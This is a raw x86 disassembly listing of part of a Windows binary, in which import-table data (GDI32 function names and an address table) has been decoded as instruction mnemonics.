  428c62:	popa   
  428c63:	jo     0x428cb2
  428c65:	outs   dx,DWORD PTR ds:[esi]
  428c66:	fs add BYTE PTR gs:[eax],al
  428c6a:	leave  
  428c6b:	add    DWORD PTR [edx+0x6f],edx
  428c6e:	jne    0x428cde
  428c70:	fs push edx
  428c72:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c77:	add    BYTE PTR [edx+0x69],al
  428c7a:	je     0x428cbe
  428c7c:	ins    BYTE PTR es:[edi],dx
  428c7d:	je     0x428c7f
  428c7f:	add    BYTE PTR [ebx+0x61655201],bh
  428c85:	ins    BYTE PTR es:[edi],dx
  428c86:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c8d:	je     0x428d03
  428c8f:	add    BYTE PTR gs:[eax],al
  428c92:	jge    0x428c95
  428c94:	inc    edi
  428c95:	gs je  0x428ceb
  428c98:	jns    0x428d0d
  428c9a:	je     0x428d01
  428c9c:	ins    DWORD PTR es:[edi],dx
  428c9d:	push   eax
  428c9e:	popa   
  428c9f:	ins    BYTE PTR es:[edi],dx
  428ca0:	gs je  0x428d17
  428ca3:	gs push ebp
  428ca5:	jae    0x428d0c
  428ca7:	add    BYTE PTR [eax+0x74654701],cl
  428cad:	push   esp
  428cae:	gs js  0x428d25
  428cb1:	inc    ebp
  428cb2:	js     0x428d28
  428cb4:	outs   dx,BYTE PTR gs:[esi]
  428cb6:	je     0x428d08
  428cb8:	outs   dx,DWORD PTR ds:[esi]
  428cb9:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428cc0:	push   ebx
  428cc1:	arpl   WORD PTR [ecx+0x6c],sp
  428cc4:	gs push esi
  428cc6:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428ccd:	inc    ebp
  428cce:	js     0x428d44
  428cd0:	inc    ebp
  428cd1:	js     0x428cd3
  428cd3:	add    bh,cl
  428cd5:	add    DWORD PTR [ebx+0x65],edx
  428cd8:	ins    BYTE PTR es:[edi],dx
  428cd9:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428cde:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428ce5:	add    DWORD PTR [ebx+0x65],edx
  428ce8:	je     0x428d3e
  428cea:	gs js  0x428d61
  428ced:	inc    ebx
  428cee:	outs   dx,DWORD PTR ds:[esi]
  428cef:	ins    BYTE PTR es:[edi],dx
  428cf0:	outs   dx,DWORD PTR ds:[esi]
  428cf1:	jb     0x428cf3
  428cf3:	add    BYTE PTR [eax+0x74615001],ch
  428cf9:	push   0x65526f54
  428cfe:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428d06:	inc    ebx
  428d07:	outs   dx,DWORD PTR ds:[esi]
  428d08:	ins    DWORD PTR es:[edi],dx
  428d09:	bound  ebp,QWORD PTR [ecx+0x6e]
  428d0c:	gs push edx
  428d0e:	outs   dx,BYTE PTR ds:[si]
  428d10:	add    BYTE PTR [eax],al
  428d12:	lods   al,BYTE PTR ds:[esi]
  428d13:	add    BYTE PTR [ebx+0x72],al
  428d16:	gs popa 
  428d18:	je     0x428d7f
  428d1a:	push   edx
  428d1b:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428d20:	outs   dx,BYTE PTR ds:[esi]
  428d21:	dec    ecx
  428d22:	outs   dx,BYTE PTR ds:[esi]
  428d23:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428d2b:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428d2f:	gs push esp
  428d31:	outs   dx,DWORD PTR ds:[esi]
  428d32:	add    BYTE PTR [eax],al
  428d34:	mov    ds:0x65724300,al
  428d39:	popa   
  428d3a:	je     0x428da1
  428d3c:	dec    ecx
  428d3d:	inc    ebx
  428d3e:	push   edi
  428d3f:	add    BYTE PTR [ebp+0x63655201],bh
  428d45:	je     0x428d9d
  428d47:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d4f:	add    BYTE PTR [ebx+0x72],al
  428d52:	gs popa 
  428d54:	je     0x428dbb
  428d56:	push   eax
  428d57:	popa   
  428d58:	ins    BYTE PTR es:[edi],dx
  428d59:	gs je  0x428dd0
  428d5c:	add    BYTE PTR gs:[edi+0x44],al
  428d60:	dec    ecx
  428d61:	xor    esi,DWORD PTR [edx]
  428d63:	cs fs ins BYTE PTR es:[edi],dx
  428d66:	ins    BYTE PTR es:[edi],dx
	...
  428d6f:	add    BYTE PTR [ebp+0x220],ch
	...
  428d8d:	add    BYTE PTR [eax],al
  428d8f:	add    BYTE PTR [ebx+0x28d],ch
	...
  428d9d:	add    BYTE PTR [eax],al
  428d9f:	add    BYTE PTR [ecx+0x64],ch
  428da2:	js     0x428e0d
  428da4:	outs   dx,DWORD PTR fs:[esi]
  428da6:	arpl   WORD PTR cs:[edi+0x6d],bp
  428daa:	add    BYTE PTR [ebx+0x65],dl
  428dad:	je     0x428df0
  428daf:	outs   dx,BYTE PTR ds:[esi]
  428db0:	arpl   WORD PTR [eax+0x6f],bp
  428db3:	jb     0x428e04
  428db5:	jb     0x428e20
  428db7:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428dbf:	add    BYTE PTR [eax],al
  428dc1:	add    BYTE PTR [eax],al
  428dc3:	add    BYTE PTR [eax],bh
  428dc5:	xchg   BYTE PTR [edx],al
  428dc7:	add    BYTE PTR [esi+eax*4+0x2],dl
  428dcb:	add    BYTE PTR [esi-0x7a],ah
  428dce:	add    al,BYTE PTR [eax]
  428dd0:	js     0x428d58
  428dd2:	add    al,BYTE PTR [eax]
  428dd4:	nop
  428dd5:	xchg   BYTE PTR [edx],al
  428dd7:	add    BYTE PTR [esi+eax*4-0x7941fffe],ah
  428dde:	add    al,BYTE PTR [eax]
  428de0:	add    BYTE PTR [eax],al
  428de2:	add    BYTE PTR [eax],al
  428de4:	loopne 0x428d6c
  428de6:	add    al,BYTE PTR [eax]
  428de8:	inc    BYTE PTR [esi-0x78f3fffe]
  428dee:	add    al,BYTE PTR [eax]
  428df0:	sbb    al,BYTE PTR [edi-0x78d1fffe]
  428df6:	add    al,BYTE PTR [eax]
  428df8:	cmp    al,0x87
  428dfa:	add    al,BYTE PTR [eax]
  428dfc:	dec    esi
  428dfd:	xchg   DWORD PTR [edx],eax
  428dff:	add    BYTE PTR [eax-0x79],ah
  428e02:	add    al,BYTE PTR [eax]
  428e04:	outs   dx,BYTE PTR ds:[esi]
  428e05:	xchg   DWORD PTR [edx],eax
  428e07:	add    BYTE PTR [eax-0x6dfffd79],al
  428e0d:	xchg   DWORD PTR [edx],eax
  428e0f:	add    BYTE PTR [eax-0x51fffd79],ah
  428e15:	xchg   DWORD PTR [edx],eax
  428e17:	add    al,al
  428e19:	xchg   DWORD PTR [edx],eax
  428e1b:	add    ah,cl
  428e1d:	xchg   DWORD PTR [edx],eax
  428e1f:	add    dl,ah
  428e21:	xchg   DWORD PTR [edx],eax
  428e23:	add    ah,dh
  428e25:	xchg   DWORD PTR [edx],eax
  428e27:	add    BYTE PTR [esi],al
  428e29:	mov    BYTE PTR [edx],al
  428e2b:	add    BYTE PTR [edx],dl
  428e2d:	mov    BYTE PTR [edx],al
  428e2f:	add    BYTE PTR [edx],ah
  428e31:	mov    BYTE PTR [edx],al
  428e33:	add    BYTE PTR [edx],dh
  428e35:	mov    BYTE PTR [edx],al
  428e37:	add    BYTE PTR [eax-0x78],cl
  428e3a:	add    al,BYTE PTR [eax]
  428e3c:	push   esp
  428e3d:	mov    BYTE PTR [edx],al
  428e3f:	add    BYTE PTR [esi-0x78],ah
  428e42:	add    al,BYTE PTR [eax]
  428e44:	jl     0x428dce
  428e46:	add    al,BYTE PTR [eax]
  428e48:	mov    cs,WORD PTR [eax-0x7763fffe]
  428e4e:	add    al,BYTE PTR [eax]
  428e50:	lods   al,BYTE PTR ds:[esi]
  428e51:	mov    BYTE PTR [edx],al
  428e53:	add    BYTE PTR [esi-0x2dfffd78],bh
  428e59:	mov    BYTE PTR [edx],al
  428e5b:	add    al,ch
  428e5d:	mov    BYTE PTR [edx],al
  428e5f:	add    dl,bh
  428e61:	mov    BYTE PTR [edx],al
  428e63:	add    BYTE PTR [ecx+ecx*4],cl
  428e66:	add    al,BYTE PTR [eax]
  428e68:	sbb    al,0x89
  428e6a:	add    al,BYTE PTR [eax]
  428e6c:	sub    al,0x89
  428e6e:	add    al,BYTE PTR [eax]
  428e70:	cmp    al,0x89
  428e72:	add    al,BYTE PTR [eax]
  428e74:	dec    esi
  428e75:	mov    DWORD PTR [edx],eax
  428e77:	add    BYTE PTR [ecx+ecx*4+0x2],bl
  428e7b:	add    BYTE PTR [edx-0x77],ch
  428e7e:	add    al,BYTE PTR [eax]
  428e80:	or     BYTE PTR [ecx-0x766bfffe],0x2
  428e87:	add    BYTE PTR [esi-0x4dfffd77],ah
  428e8d:	mov    DWORD PTR [edx],eax
  428e8f:	add    BYTE PTR [esi-0x35fffd77],bh
  428e95:	mov    DWORD PTR [edx],eax
  428e97:	add    dl,bl
  428e99:	mov    DWORD PTR [edx],eax
  428e9b:	add    al,dh
  428e9d:	mov    DWORD PTR [edx],eax
  428e9f:	add    dh,bh
  428ea1:	mov    DWORD PTR [edx],eax
  428ea3:	add    BYTE PTR [eax],dl
  428ea5:	mov    al,BYTE PTR [edx]
  428ea7:	add    BYTE PTR [edx],ah
  428ea9:	mov    al,BYTE PTR [edx]
  428eab:	add    BYTE PTR [eax],al
  428ead:	add    BYTE PTR [eax],al
  428eaf:	add    BYTE PTR [edx+ecx*4],bh
  428eb2:	add    al,BYTE PTR [eax]
  428eb4:	add    BYTE PTR [eax],al
  428eb6:	add    BYTE PTR [eax],al
  428eb8:	pop    edx
  428eb9:	mov    al,BYTE PTR [edx]
  428ebb:	add    BYTE PTR [edx+ecx*4+0x2],ch
  428ebf:	add    BYTE PTR [esi-0x76],bh
  428ec2:	add    al,BYTE PTR [eax]
  428ec4:	xchg   esp,eax
  428ec5:	mov    al,BYTE PTR [edx]
  428ec7:	add    BYTE PTR [esi-0x47fffd76],ah
  428ecd:	mov    al,BYTE PTR [edx]
  428ecf:	add    al,cl
  428ed1:	mov    al,BYTE PTR [edx]
  428ed3:	add    dh,ah
  428ed5:	mov    al,BYTE PTR [edx]
  428ed7:	add    dh,dh
  428ed9:	mov    al,BYTE PTR [edx]
  428edb:	add    BYTE PTR [ebx+ecx*4],al
  428ede:	add    al,BYTE PTR [eax]
  428ee0:	adc    al,0x8b
  428ee2:	add    al,BYTE PTR [eax]
  428ee4:	and    cl,BYTE PTR [ebx-0x74cdfffe]
  428eea:	add    al,BYTE PTR [eax]
  428eec:	mov    eax,DWORD PTR ds:[edx]
  428eef:	add    BYTE PTR [eax-0x75],dl
  428ef2:	add    al,BYTE PTR [eax]
  428ef4:	bound  ecx,QWORD PTR [ebx-0x7487fffe]
  428efa:	add    al,BYTE PTR [eax]
  428efc:	xchg   BYTE PTR [ebx-0x746dfffe],cl
  428f02:	add    al,BYTE PTR [eax]
  428f04:	lods   al,BYTE PTR ds:[esi]
  428f05:	mov    eax,DWORD PTR [edx]
  428f07:	add    ah,al
  428f09:	mov    eax,DWORD PTR [edx]
  428f0b:	add    ah,bl
  428f0d:	mov    eax,DWORD PTR [edx]
  428f0f:	add    dl,ch
  428f11:	mov    eax,DWORD PTR [edx]
  428f13:	add    dh,dh
  428f15:	mov    eax,DWORD PTR [edx]
  428f17:	add    BYTE PTR [eax],cl
  428f19:	mov    WORD PTR [edx],es
  428f1b:	add    BYTE PTR [eax],al
  428f1d:	add    BYTE PTR [eax],al
  428f1f:	add    BYTE PTR [eax],ch
  428f21:	mov    WORD PTR [edx],es
  428f23:	add    BYTE PTR [edx],dh
  428f25:	mov    WORD PTR [edx],es
  428f27:	add    BYTE PTR [eax-0x74],al
  428f2a:	add    al,BYTE PTR [eax]
  428f2c:	dec    esp
  428f2d:	mov    WORD PTR [edx],es
  428f2f:	add    BYTE PTR [esp+ecx*4+0x2],bl
  428f33:	add    BYTE PTR [edx-0x74],ch
  428f36:	add    al,BYTE PTR [eax]
  428f38:	jbe    0x428ec6
  428f3a:	add    al,BYTE PTR [eax]
  428f3c:	or     BYTE PTR [edx+eax*1+0x28c9200],0x0
  428f44:	test   al,0x8c
  428f46:	add    al,BYTE PTR [eax]
  428f48:	mov    esi,0xd400028c
  428f4d:	mov    WORD PTR [edx],es
  428f4f:	add    ah,ah
  428f51:	mov    WORD PTR [edx],es
  428f53:	add    ah,dh
  428f55:	mov    WORD PTR [edx],es
  428f57:	add    BYTE PTR [ecx*4-0x72edfffe],al
  428f5e:	add    al,BYTE PTR [eax]
  428f60:	sub    cl,BYTE PTR [ebp-0x72cbfffe]
  428f66:	add    al,BYTE PTR [eax]
  428f68:	inc    eax
  428f69:	lea    eax,[edx]
  428f6b:	add    BYTE PTR [esi-0x73],cl
  428f6e:	add    al,BYTE PTR [eax]
  428f70:	add    BYTE PTR [eax],al
	...
